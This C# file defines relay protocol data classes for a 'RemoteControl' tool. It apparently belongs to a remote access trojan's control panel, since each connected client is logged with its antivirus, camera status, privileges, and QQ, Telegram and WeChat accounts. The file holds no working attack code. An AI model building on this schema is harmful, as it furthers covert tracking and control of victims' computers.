using System;
using System.Collections.Generic;

namespace RemoteControl.Protocals.Relay
{
    /// <summary>
    /// 在线客户端信息
    /// </summary>
    public class RelayClientInfo
    {
        public string ClientId = "";
        public string HostName = "";
        public string IP = "";
        public string AppPath = "";
        public string OnlineAvatar = "";
        public string OnlineTime = "";
        public string UserName = "";
        public string LocalIP = "";
        public string OSVersion = "";
        public string Privilege = "";
        public string CameraStatus = "";
        public string Antivirus = "";
        public string OnlineQQ = "";
        public string TG = "";
        public string WX = "";
        public string UserStatus = "";
        public string Region = "";
        public string ISP = "";
    }

    /// <summary>
    /// 客户端列表响应
    /// </summary>
    public class RelayClientListResponse
    {
        public List<RelayClientInfo> Clients = new List<RelayClientInfo>();
    }

    /// <summary>
    /// 选择控制目标客户端
    /// </summary>
    public class RelaySelectClient
    {
        public string ClientId = "";
    }

    /// <summary>
    /// 客户端上线通知
    /// </summary>
    public class RelayClientOnline
    {
        public string ClientId = "";
        public string HostName = "";
        public string IP = "";
        public string AppPath = "";
        public string OnlineAvatar = "";
        public string OnlineTime = "";
        public string UserName = "";
        public string LocalIP = "";
        public string OSVersion = "";
        public string Privilege = "";
        public string CameraStatus = "";
        public string Antivirus = "";
        public string OnlineQQ = "";
        public string TG = "";
        public string WX = "";
        public string UserStatus = "";
        public string Region = "";
        public string ISP = "";
    }

    /// <summary>
    /// 客户端下线通知
    /// </summary>
    public class RelayClientOffline
    {
        public string ClientId = "";
    }
}
